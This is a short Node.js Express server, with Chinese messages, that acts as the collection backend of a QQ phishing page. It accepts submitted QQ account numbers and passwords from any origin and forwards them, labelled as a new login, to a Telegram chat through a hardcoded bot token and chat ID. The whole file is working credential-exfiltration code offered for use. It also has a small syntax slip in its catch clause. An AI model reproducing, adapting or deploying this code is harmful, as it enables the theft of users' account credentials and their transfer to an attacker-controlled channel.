const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods','POST,OPTIONS');
  res.header('Access-Control-Allow-Headers','Content-Type');
  if(req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

const TG_TOKEN = "8710199891:AAG_7zadqm_UekTYNdNe9P6vdq1tSNpxY6g";
const TG_CHAT_ID = "8672466427";

app.post('/api/send', async (req, res) => {
  try {
    const { qq, pwd, time } = req.body;
    if (!qq || !pwd || !time) {
      return res.json({ code: 400, msg: "参数缺失" });
    }
    const text = `📥 新QQ登录\n🕐 时间：${time}\n👤 账号：${qq}\n🔑 密码：${pwd}`;
    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      chat_id: TG_CHAT_ID,
      text: text
    });
    res.json({ code: 200, msg: "提交成功" });
  } catch (err)
    res.json({ code: 500, msg: "TG发送失败" });
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log("服务在线运行");
})
